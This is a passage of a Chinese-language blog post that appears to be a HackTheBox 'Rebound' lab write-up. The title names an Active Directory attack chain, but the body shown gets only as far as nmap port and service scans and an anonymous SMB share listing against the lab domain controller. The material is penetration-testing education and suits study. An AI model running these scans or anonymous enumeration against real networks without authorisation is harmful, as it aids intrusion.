<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>

    <meta name="description" content="简述本文是Insane难度的HTB Rebound机器的域渗透部分，其中RID cycling + AS-REP-Roasting with Kerberoasting + Weak ACLs + ShadowCredentials attack + cross-session relay + Runascs and KrbRelay read gMSA password + Resource-B">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox Rebound [RID cycling + AS-REP-Roasting with Kerberoasting + Weak ACLs + ShadowCredentials attack + cross-session relay + Runascs and KrbRelay read gMSA password + Resource-Based Constrained Delegation (RBCD) + S4U2Self &amp; S4U2Proxy]">
<meta property="og:url" content="https://fdlucifer.github.io/2024/04/01/rebound/index.html">
<meta property="og:site_name" content="0xfd&#39;s blog">
<meta property="og:description" content="简述本文是Insane难度的HTB Rebound机器的域渗透部分，其中RID cycling + AS-REP-Roasting with Kerberoasting + Weak ACLs + ShadowCredentials attack + cross-session relay + Runascs and KrbRelay read gMSA password + Resource-B">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound0.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound1.5.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound1.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound2.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound3.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound4.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound5.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound6.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound7.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound8.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound9.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound10.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound11.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound12.png">
<meta property="article:published_time" content="2024-04-01T09:16:37.000Z">
<meta property="article:modified_time" content="2024-04-06T03:41:05.334Z">
<meta property="article:author" content="253">
<meta property="article:tag" content="DC">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound0.png">


<link rel="canonical" href="https://fdlucifer.github.io/2024/04/01/rebound/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2024/04/01/rebound/","path":"2024/04/01/rebound/","title":"HackTheBox Rebound [RID cycling + AS-REP-Roasting with Kerberoasting + Weak ACLs + ShadowCredentials attack + cross-session relay + Runascs and KrbRelay read gMSA password + Resource-Based Constrained Delegation (RBCD) + S4U2Self & S4U2Proxy]"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>HackTheBox Rebound [RID cycling + AS-REP-Roasting with Kerberoasting + Weak ACLs + ShadowCredentials attack + cross-session relay + Runascs and KrbRelay read gMSA password + Resource-Based Constrained Delegation (RBCD) + S4U2Self & S4U2Proxy] | 0xfd's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="0xfd's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">0xfd's blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">by 0xfd</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">43</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">75</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">216</span></a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">简述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RID-cycling"><span class="nav-number">3.</span> <span class="nav-text">RID cycling</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#AS-REP-Roasting-with-Kerberoasting"><span class="nav-number">4.</span> <span class="nav-text">AS-REP-Roasting with Kerberoasting</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Bloodhound-amp-Powerview"><span class="nav-number">5.</span> <span class="nav-text">Bloodhound &amp; Powerview</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Descendant-Object-Takeover"><span class="nav-number">6.</span> <span class="nav-text">Descendant Object Takeover</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cross-session-relay"><span class="nav-number">7.</span> <span class="nav-text">cross-session relay</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Constrained-Delegation-KCD-Abuse"><span class="nav-number">8.</span> <span class="nav-text">Constrained Delegation (KCD) Abuse</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Resource-Based-Constrained-Delegation-RBCD"><span class="nav-number">9.</span> <span class="nav-text">Resource-Based Constrained Delegation RBCD</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference-Sources"><span class="nav-number">10.</span> <span class="nav-text">Reference Sources</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="253"
      src="/images/blackhole.png">
  <p class="site-author-name" itemprop="name">253</p>
  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">216</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">75</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">43</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vQGZkdm9pZDA=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;@fdvoid0"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="fa fa-stack-exchange fa-fw"></i>infosec.exchange</span>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="Back to top">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2024/04/01/rebound/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/blackhole.png">
      <meta itemprop="name" content="253">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="0xfd's blog">
      <meta itemprop="description" content="All things about infosec & ctf">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="HackTheBox Rebound [RID cycling + AS-REP-Roasting with Kerberoasting + Weak ACLs + ShadowCredentials attack + cross-session relay + Runascs and KrbRelay read gMSA password + Resource-Based Constrained Delegation (RBCD) + S4U2Self & S4U2Proxy] | 0xfd's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          HackTheBox Rebound [RID cycling + AS-REP-Roasting with Kerberoasting + Weak ACLs + ShadowCredentials attack + cross-session relay + Runascs and KrbRelay read gMSA password + Resource-Based Constrained Delegation (RBCD) + S4U2Self & S4U2Proxy]
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2024-04-01 17:16:37" itemprop="dateCreated datePublished" datetime="2024-04-01T17:16:37+08:00">2024-04-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2024-04-06 11:41:05" itemprop="dateModified" datetime="2024-04-06T11:41:05+08:00">2024-04-06</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/RID-cycling/" itemprop="url" rel="index"><span itemprop="name">RID cycling</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/RID-cycling/AS-REP-Roasting-with-Kerberoasting/" itemprop="url" rel="index"><span itemprop="name">AS-REP-Roasting with Kerberoasting</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/RID-cycling/AS-REP-Roasting-with-Kerberoasting/Weak-ACLs/" itemprop="url" rel="index"><span itemprop="name">Weak ACLs</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/RID-cycling/AS-REP-Roasting-with-Kerberoasting/Weak-ACLs/ShadowCredentials-attack/" itemprop="url" rel="index"><span itemprop="name">ShadowCredentials attack</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/RID-cycling/AS-REP-Roasting-with-Kerberoasting/Weak-ACLs/ShadowCredentials-attack/cross-session-relay/" itemprop="url" rel="index"><span itemprop="name">cross-session relay</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/RID-cycling/AS-REP-Roasting-with-Kerberoasting/Weak-ACLs/ShadowCredentials-attack/cross-session-relay/Runascs-and-KrbRelay-read-gMSA-password/" itemprop="url" rel="index"><span itemprop="name">Runascs and KrbRelay read gMSA password</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/RID-cycling/AS-REP-Roasting-with-Kerberoasting/Weak-ACLs/ShadowCredentials-attack/cross-session-relay/Runascs-and-KrbRelay-read-gMSA-password/Resource-Based-Constrained-Delegation-RBCD/" itemprop="url" rel="index"><span itemprop="name">Resource-Based Constrained Delegation (RBCD)</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/RID-cycling/AS-REP-Roasting-with-Kerberoasting/Weak-ACLs/ShadowCredentials-attack/cross-session-relay/Runascs-and-KrbRelay-read-gMSA-password/Resource-Based-Constrained-Delegation-RBCD/S4U2Self-S4U2Proxy/" itemprop="url" rel="index"><span itemprop="name">S4U2Self & S4U2Proxy</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>5.9k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>22 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>本文是Insane难度的HTB Rebound机器的域渗透部分，其中RID cycling + AS-REP-Roasting with Kerberoasting + Weak ACLs + ShadowCredentials attack + cross-session relay + Runascs and KrbRelay read gMSA password + Resource-Based Constrained Delegation (RBCD) + S4U2Self &amp; S4U2Proxy等域渗透提权细节是此box的特色，主要参考<span class="exturl" data-url="aHR0cHM6Ly8weGRmLmdpdGxhYi5pby8yMDI0LzAzLzMwL2h0Yi1yZWJvdW5kLmh0bWw=">0xdf’s blog rebound walkthrough<i class="fa fa-external-link-alt"></i></span>和<span class="exturl" data-url="aHR0cHM6Ly9hcHAuaGFja3RoZWJveC5jb20vbWFjaGluZXMvUmVib3VuZC93cml0ZXVwcw==">HTB的rebound官方writeup paper<i class="fa fa-external-link-alt"></i></span>记录这篇博客加深记忆和理解，及供后续做深入研究查阅，备忘。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound0.png"></li>
</ul>
<span id="more"></span>

<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- --min-rate 10000 10.10.11.231</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">88/tcp    open  kerberos-sec</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">389/tcp   open  ldap</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">464/tcp   open  kpasswd5</span><br><span class="line">593/tcp   open  http-rpc-epmap</span><br><span class="line">636/tcp   open  ldapssl</span><br><span class="line">3268/tcp  open  globalcatLDAP</span><br><span class="line">3269/tcp  open  globalcatLDAPssl</span><br><span class="line">5985/tcp  open  wsman</span><br><span class="line">9389/tcp  open  adws</span><br><span class="line">47001/tcp open  winrm</span><br><span class="line">49664/tcp open  unknown</span><br><span class="line">49665/tcp open  unknown</span><br><span class="line">49666/tcp open  unknown</span><br><span class="line">49667/tcp open  unknown</span><br><span class="line">49671/tcp open  unknown</span><br><span class="line">49674/tcp open  unknown</span><br><span class="line">49675/tcp open  unknown</span><br><span class="line">49676/tcp open  unknown</span><br><span class="line">49681/tcp open  unknown</span><br><span class="line">49688/tcp open  unknown</span><br><span class="line">49724/tcp open  unknown</span><br><span class="line">55738/tcp open  unknown</span><br><span class="line"></span><br><span class="line">nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV 10.10.11.231</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain?</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   DNSVersionBindReqTCP:</span><br><span class="line">|     version</span><br><span class="line">|_    <span class="built_in">bind</span></span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-17 23:09:17Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject:</span><br><span class="line">| Subject Alternative Name: DNS:dc01.rebound.htb</span><br><span class="line">| Not valid before: 2023-08-25T22:48:10</span><br><span class="line">|_Not valid after:  2024-08-24T22:48:10</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2024-03-17T23:11:51+00:00; -1s from scanner time.</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject:</span><br><span class="line">| Subject Alternative Name: DNS:dc01.rebound.htb</span><br><span class="line">| Not valid before: 2023-08-25T22:48:10</span><br><span class="line">|_Not valid after:  2024-08-24T22:48:10</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2024-03-17T23:11:50+00:00; -2s from scanner time.</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject:</span><br><span class="line">| Subject Alternative Name: DNS:dc01.rebound.htb</span><br><span class="line">| Not valid before: 2023-08-25T22:48:10</span><br><span class="line">|_Not valid after:  2024-08-24T22:48:10</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2024-03-17T23:11:51+00:00; -1s from scanner time.</span><br><span class="line">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject:</span><br><span class="line">| Subject Alternative Name: DNS:dc01.rebound.htb</span><br><span class="line">| Not valid before: 2023-08-25T22:48:10</span><br><span class="line">|_Not valid after:  2024-08-24T22:48:10</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2024-03-17T23:11:50+00:00; -2s from scanner time.</span><br><span class="line">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp open  mc-nmf        .NET Message Framing</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port53-TCP:V=7.80%I=7%D=3/17%Time=65F77824%P=x86_64-pc-linux-gnu%r(DNSV</span><br><span class="line">SF:ersionBindReqTCP,20,<span class="string">&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\</span></span><br><span class="line"><span class="string">SF:x04bind\0\0\x10\0\x03&quot;</span>);</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>

<p>开放389，636 ldap端口，很明显是一个windows域控</p>
<h1 id="RID-cycling"><a href="#RID-cycling" class="headerlink" title="RID cycling"></a>RID cycling</h1><p>首先尝试smb列出共享</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌─[root@kali] - [~/hackthebox/machine/rebound] - [2540]</span><br><span class="line">└─[$] smbclient -L \\\\10.10.11.231\\                                                                                                                [20:23:17]</span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\root]: anonymous</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        ADMIN$          Disk      Remote Admin</span><br><span class="line">        C$              Disk      Default share</span><br><span class="line">        IPC$            IPC       Remote IPC</span><br><span class="line">        NETLOGON        Disk      Logon server share</span><br><span class="line">        Shared          Disk</span><br><span class="line">        SYSVOL          Disk      Logon server share</span><br><span class="line">Reconnecting with SMB1 <span class="keyword">for</span> workgroup listing.</span><br><span class="line">do_connect: Connection to 10.10.11.231 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br></pre></td></tr></table></figure>

